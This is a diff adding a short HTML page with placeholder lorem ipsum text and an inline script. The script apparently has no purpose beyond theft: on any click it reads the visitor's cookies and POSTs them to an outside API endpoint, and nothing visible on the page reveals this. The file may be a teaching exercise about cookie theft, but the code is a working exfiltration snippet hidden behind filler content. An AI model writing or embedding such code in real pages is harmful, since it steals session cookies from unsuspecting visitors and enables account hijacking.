@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <h1>Lorem ipsum dolor sit amet.</h1>
+    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Porro pariatur nam ut! Aliquam, perferendis ut. Labore vitae molestias recusandae eaque, quam fugit ab quas voluptas adipisci illo possimus ipsam sit.</p>
+
+
+
+    <script>
+        window.addEventListener("click", ()=>{
+            // console.log(document.cookie);
+            fetch("https://northwind.vercel.app/api/categories/", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(
+                    {
+                        data: document.cookie,
+                    }
+                )
+            })
+        })
+    </script>
+</body>
+</html>
